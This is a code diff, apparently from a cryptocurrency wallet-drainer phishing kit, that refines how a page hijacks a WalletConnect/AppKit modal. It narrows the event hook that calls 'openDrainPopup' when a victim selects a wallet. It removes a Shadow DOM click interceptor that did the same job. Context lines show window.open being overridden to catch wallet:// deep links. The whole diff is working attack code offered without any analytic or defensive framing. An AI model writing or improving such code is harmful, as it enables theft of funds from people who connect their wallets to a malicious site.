@@ -92,16 +92,18 @@ function openDrainPopup(walletName) {
 // INTERCEPT WALLET CLICKS
 // =====================================================
 
-// Track last clicked wallet name from Shadow DOM
+// Track last selected wallet name
 let lastClickedWallet = '';
 
-// Method 1: AppKit subscribe events — catch SELECT_WALLET with wallet name
+// Method 1: AppKit subscribe events — only SELECT_WALLET (actual wallet selection)
 modal.subscribeEvents((event) => {
   const e = event?.data?.event;
-  if (e === 'SELECT_WALLET' || e === 'CLICK_WALLET' || e === 'CONNECT_PRESS') {
-    // Try to get wallet name from event properties
-    const name = event?.data?.properties?.name || event?.data?.properties?.wallet || lastClickedWallet || '';
-    openDrainPopup(name);
+  if (e === 'SELECT_WALLET') {
+    const name = event?.data?.properties?.name || event?.data?.properties?.wallet || '';
+    if (name) {
+      lastClickedWallet = name;
+      openDrainPopup(name);
+    }
   }
 });
 
@@ -112,31 +114,6 @@ modal.subscribeProviders((state) => {
     openDrainPopup(lastClickedWallet);
   }
 });
-
-// Method 3: Shadow DOM click interceptor — extract wallet name from clicked element
-const domObserver = new MutationObserver(() => {
-  const w3m = document.querySelector('w3m-modal');
-  if (!w3m || w3m._clickPatched) return;
-  w3m._clickPatched = true;
-
-  w3m.addEventListener('click', (e) => {
-    const path = e.composedPath();
-    for (const el of path) {
-      if (!el.tagName) continue;
-      const tag = el.tagName.toLowerCase();
-      // Only catch individual wallet items, NOT the "All Wallets" button
-      if (tag === 'wui-list-wallet') {
-        const name = el.getAttribute?.('name') ||
-                     el.getAttribute?.('walletid') ||
-                     el.textContent?.trim()?.split('\n')?.[0]?.trim() || '';
-        lastClickedWallet = name;
-        setTimeout(() => openDrainPopup(name), 50);
-        return;
-      }
-    }
-  }, true);
-});
-domObserver.observe(document.body, { childList: true, subtree: true });
 
 // Method 4: Intercept deep links (wallet:// protocol opens)
 window.open = function(url, ...args) {
